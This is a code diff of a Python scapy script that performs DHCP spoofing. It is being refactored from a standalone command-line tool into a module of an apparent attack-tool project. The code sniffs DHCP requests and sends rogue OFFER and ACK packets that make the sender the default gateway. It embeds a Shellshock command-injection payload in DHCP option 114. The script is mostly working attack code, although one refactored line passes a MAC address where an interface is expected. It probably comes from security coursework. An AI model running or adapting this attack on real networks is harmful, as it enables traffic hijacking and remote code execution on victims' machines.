@@ -1,32 +1,12 @@
-#!/usr/bin/env python3
 # https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/dhcp_spoofer.py
-"""scapy-dhcp-listener.py
-Listen for DHCP packets using scapy to learn when LAN 
-hosts request IP addresses from DHCP Servers.
-Copyright (C) 2019 Shamiul Hasan
-License MIT
-"""
 
-from __future__ import print_function
-
-import argparse
 import binascii
 
-from scapy.all import *
-from scapy.layers.dhcp import DHCP, BOOTP
-from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from Project import *
 
-__version__ = "0.0.3"
-
-parser = argparse.ArgumentParser(description='DHCPShock', epilog='Shock dem shells!')
-parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
-parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: "echo pwned"]')
-
-args = parser.parse_args()
-
-command = args.cmd or "echo 'pwned'"
-
+req_port = "any"
+name = "DHCP Spoofing"
+function_name = "spoofing"
 
 # Fixup function to extract dhcp_options by key
 def get_option(dhcp_options, key):
@@ -48,47 +28,35 @@ def get_option(dhcp_options, key):
         pass
 
 
-my_real_ip = '192.168.0.100'
-broadcast_ip = '255.255.255.255'
-fake_my_ip = '192.168.0.38'
-fake_your_ip = '192.168.0.76'
-fake_server_ip = my_real_ip
-fake_subnet_mask = '255.255.255.0'
-fake_router_ip = my_real_ip  # default gateway
-fake_lease_time = 192800
-fake_renewal_time = 186400
-fake_rebinding_time = 138240
-
-
 def make_dhcp_offer_packet(raw_mac, xid):
-    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src=fake_my_ip, dst=broadcast_ip) /
+    packet = (Ether(src=source_mac, dst='ff:ff:ff:ff:ff:ff') /
+              IP(src=fake_my_ip, dst='255.255.255.255') /
               UDP(sport=67, dport=68) /
               BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
               DHCP(options=[("message-type", "offer"),
                             ('server_id', fake_server_ip),
-                            ('subnet_mask', fake_subnet_mask),
+                            ('subnet_mask', '255.255.255.0'),
                             ('router', fake_router_ip),
-                            ('lease_time', fake_lease_time),
-                            ('renewal_time', fake_renewal_time),
-                            ('rebinding_time', fake_rebinding_time),
+                            ('lease_time', 192800),
+                            ('renewal_time', 186400),
+                            ('rebinding_time', 138240),
                             "end"]))
 
     return packet
 
 
 def make_dhcp_ack_packet(raw_mac, xid, command):
-    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
+    packet = (Ether(src=source_mac, dst='ff:ff:ff:ff:ff:ff') /
               IP(src=fake_my_ip, dst='255.255.255.255') /
               UDP(sport=67, dport=68) /
               BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
               DHCP(options=[("message-type", "ack"),
                             ('server_id', fake_server_ip),
-                            ('subnet_mask', fake_subnet_mask),
+                            ('subnet_mask', '255.255.255.0'),
                             ('router', fake_router_ip),
-                            ('lease_time', fake_lease_time),
-                            ('renewal_time', fake_renewal_time),
-                            ('rebinding_time', fake_rebinding_time),
+                            ('lease_time', 192800),
+                            ('renewal_time', 186400),
+                            ('rebinding_time', 138240),
                             (114, b"() { ignored;}; " + b"echo \'pwned\'"),
                             "end"]))
 
@@ -108,7 +76,8 @@ def send_rogue_dhcp_offer_packet(packet):
     # print('New Packet data is:')
     # print(new_packet.show())
     print("\n[*] Sending Rogue OFFER...")
-    sendp(new_packet, iface=args.iface)
+    #sendp(new_packet, iface=values.get("iface"))
+    sendp(new_packet, iface=source_mac)
 
     print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
     return
@@ -128,7 +97,8 @@ def send_rogue_dhcp_ACK_packet(packet):
     # print('New Packet data is:')
     # print(new_packet.show())
     print("\n[*] Sending ACK...")
-    sendp(new_packet, iface=args.iface)
+    #sendp(new_packet, iface=values.get("iface"))
+    sendp(new_packet, iface=source_mac)
     print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')
 
     return
@@ -224,6 +194,20 @@ def handle_dhcp_packet(packet):
 
     return
 
-
-if __name__ == "__main__":
-    sniff(iface=args.iface, filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
+def spoofing(values):
+    global fake_my_ip
+    global fake_your_ip
+    global fake_server_ip
+    global fake_router_ip
+    global source_mac
+    global command
+    # IP to pretend to be
+    fake_my_ip = '172.15.7.1'
+    # need to set fake IP to give
+    fake_your_ip = '172.15.7.2'
+    fake_server_ip = values.get("source_ip")
+    fake_router_ip = values.get("source_ip")  # default gateway
+    source_mac = values.get("source_mac")
+    command = "echo 'pwned'"
+    print("Waiting for DHCP request to spoof ACK and OFFER")
+    sniff(iface=values.get("iface"), filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
